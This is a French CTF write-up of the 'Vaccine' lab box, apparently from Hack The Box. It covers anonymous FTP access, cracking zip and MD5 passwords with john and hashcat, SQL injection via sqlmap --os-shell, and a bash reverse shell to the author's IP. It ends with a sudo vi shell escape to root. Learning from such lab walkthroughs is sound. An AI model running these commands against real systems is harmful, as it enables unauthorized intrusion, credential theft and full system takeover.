# VACCINE

## Task 01
Commençons avec notre famux nmap pour voir les port ouvert et les service utiliser!😌

```bash
nmap -sV -sC -p- [IP de la cible]
```

On voit tout de suite la réponse a la première question! le service en plus de SSH et de HTTP ouvert et le service `ftp`. 

---
## Task 02
Sur le quelle on sait que l'on peut ce connecter avec un login `anonymous` et un password `blank`.<br/>

---
## Task 03
Pour répondre a la question 3 on constate qu'un fichier et télécharger dans le service. Ce fichier est le `backup.zip`.

---
## Task 04
On vas donc télécharger ce fichier en commençant par ce connecter au service!! 
```bash
ftp anonymous@[ip de la cible]
```
On valide le passwor sans rien entrer et nous voila connecter! 😈

On passe tout de suite la commande: 
```bash
get backup.zip 
```
Pour pouvoir s'en occuper sur notre machine!<br/>

Et pour suivre et répondre a la question 4 on vas utiliser une comande de john qui vas nour permettre d'obtenir le code hasher de ce fichier pour pouvoir l'unzip.<br/>
On tape donc la commande :
```bash
sudo zip2jhon backup.zip > codefichierzip.txt
```

On lui précise le fichier pour le quelle on veut un hash et la destination (création de fichier avec le hash du code.)

---
## Tash 05
Obtenir le code de l'administrateur a partir de tout ca! On vas donc continuer sur notre lancer et obtenir le code de ce fichier.<br/>

Avec la commande: <br/>

```bash
sudo john --format=pkzip -w ./rockyou.txt codefichierzip.txt
```

Maintenant que c'est fait on obtien le code on vas donc deziper de fichier a la suite de la commande:

```bash
unzip backup.zip
```
Un prompt du password apparait on rentre donc le code obtenu plus tot!!!! <br/>

On voit désormais que l'on a accé a deux fichier distinct le `index.php` et le `style.css` naturelement je me direge vers le fichier php! Et en y regardant de plus pret je constate qu'un mot de passe apparait! 🤤<br/><br/>

Je vais donc de suite sur un outils en ligne qui est `hashes.com` pour identifier ce hash qui est au format `MD5`, <br/>
Puis je créer un fichier.txt pour pouvoir le faire interpreter.

```bash
echo "codeobtenuedansindex" > codeindex.txt
```

Je retourne donc sur ma machine et je vais maintenant utiliser ---> `Hashcat` <--- (pas encore trés bien compris la diiférence entre les deux mais celui ci peut me permettre de donner un format pour résoudre ce hash) Je vais doonc dans help de hashcat et tout en bas il me dit comment utiliser le tools je tape donc : 
```bash
hashcat -a 0 -m 0 codeindex.txt ./rockyou.txt
``` 
`-a`: attack mode. 0 pour straight. <br/>
`-m`: pour préciser le type de hashe. MD5 <br/>
<br/>

Je lance donc la commande et hashcat me dit que la liste n'est pas asser longue. Je relance donc:

```bash
hashcat -a 0 -m 0 codeindex.txt /usr/share/seclists/Password/Common-Credentials/100k-most-used-password.txt
```

Et voila qu'il me donne le password tant voulu celui ci est !!!!!!! qwerty789 😈😈

Et la réponse a la question 5 est la!

--- 
## Task 6

Quelle est l'option qui peut etre passer a sqlmap pour prendre les commande durant une sql injection ? 

```bash
--os-shell
```

---
## Task 07

Il nous faut maintenan trouver un moyen de ce connecter afin de continuer les tache alors comment allons nous faire ? <br/>
Une injection sql évidement car j'ai etait orienter vers ca mais comment procéder ? <br/>

Dur dur une commande m'a était transmise pour faire un sqlmap
```bash
sqlmap -u 'http://[Ip de la cible]/dashboard.php?search=any+query' --cookie="PHPSESSID=[valeur du cookie obtenue via cookie editor extension mozzila]"
```

Puis on retape la même chose avec:
```bash
--os-shell
```

Puis on ouvre un ncat sur le port 443:
```bash
nc -lvnp 443
```

Et finalement on envoi une commande qui nous permettra d'obetnir un shell:

```bash
bash -c bash -i >& /dev/tcp/[mon adress ip]/443 0>&1
```

Tout de suite on envoi une commande dans la fenetre pour pouvoir avoir ce shell stable:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```


Maintenant que celui est stble je tente:
```bash
sudo -l 
```

Ca ne fonctioone pas car je n'ai pas encore le code sudo de ce user. Je part en direction de `/var/www.hmtl`, je remonte les dossier un a un au cas je pourrais tomber sur un fichier intéréssant et par chance c'est le cas le tombe sur le `user.txt` dans le repo postgres je le cat et obtiens le user flag.<br/>
Je continue mon chemin rien d'intéréssant jusqu'a ce que j'arrive dans le dossier voulu. Arriver la je cat chaque fichier pour voir si il n'y a pas une information intéréssante. <br/>
Une fois arriver le tour de `dashboard.php` le password du user postgres est afficher sous mes yeux 😈😈😈 <br/><br/>

Je vais enfin pouvoir avoir une connection stable qui ne sera pas déconnecter toutes les 2 minute 😭 c'était dur!!<br/>

Je me connecte donc en ssh:

```bash
ssh postgres@[ip de la cible]

//prompt de password je rentre donc ce que je viens de trouver et partons à la recherche des deux dernére info demander.
```

Je peut maintenant faire un `sudo -l` car j'ai le mots de passe je m'y met pour obetnir la réponse a la question qui est :
```bash
vi
```

## Task 8 - Task 9

### USER AND ROOT FLAG
User obtenue au cour de mon exploration pour le mot de passe de postgres 
Voyons voir maintenant comment escalader les privilége pour obtenir le mot de passe root ou une facon de le contourner pour aller chercher le root flag.<br/><br/>

Incroyable ce qui viens de ce passer un nouveau truc! On peut escalader les privilége en tapant des commande depuis un fichier!<br/>

Il s'avére qu'une seul commande etait disponible en sudo `/bin/vi`, <br/>
Et ceci sur un seul fichier!! `/etc/postgresql/11/main/pg_hba.conf`. <br/><br/>

Aprés quelque recherche je comprend qu'il faut que je set un shell depuis cette commande mais comment faire??? 🤯

C'est clairement grace au walktrough encore du nouveau et j'adore ca!<br/>
J'apprend qu'il faut que je set le shell depuis l'intérieur du seul fichier que je peut editer! Pétage de crane a ouai ? <br/>
Je lance:
```bash
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```
Rentre le code du user. Puis:
```bash
: [enter]
:set shell:/bin/sh
:shell
```
Et comme par magie on a accés a un shell! Et en tapant:
```bash
whoami
```
On voit que l'on est root.
Plus qu'a prendre ce root flag... Dur dur de ne pas avoir trouver mais on en apprend tout les jours.
